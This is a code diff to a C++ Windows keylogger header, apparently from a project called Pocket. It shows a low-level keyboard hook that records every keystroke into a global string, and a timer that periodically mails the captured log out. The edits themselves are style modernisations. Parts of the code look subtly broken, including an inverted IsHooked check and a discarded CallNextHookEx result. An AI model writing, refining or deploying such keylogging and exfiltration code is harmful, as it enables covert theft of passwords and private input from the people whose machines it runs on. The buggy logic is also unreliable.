@@ -10,7 +10,7 @@
 
 using namespace std;
 
-string keylog = "";
+string keylog;
 
 void timerSendMail(){
     if (keylog.empty()) return;
@@ -28,12 +28,12 @@ void timerSendMail(){
 }
 
 Timer MailTimer(timerSendMail, 100 * 60, Timer::inf);  // 1000 = repeat every 1 min
-HHOOK eHook = NULL;
+HHOOK eHook = nullptr;
 
 LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam){
     if(nCode < 0) CallNextHookEx(eHook, nCode, wparam, lparam);
 
-    KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *) lparam;
+    auto *kbs = (KBDLLHOOKSTRUCT *) lparam;
 
     if(wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN){ // WM_IME_KEYDOWN
         keylog += Keys::KEYS[kbs->vkCode].Name; // use the system name from keyboard and use our map to convert it to a human friendly name
@@ -72,6 +72,5 @@ bool UninstallHook(){ // disable hook, doesn't kill process
 bool IsHooked() {
     return (bool)(eHook == nullptr);
 }
-
 
 #endif //POCKET_KEYBOARDHOOK_H
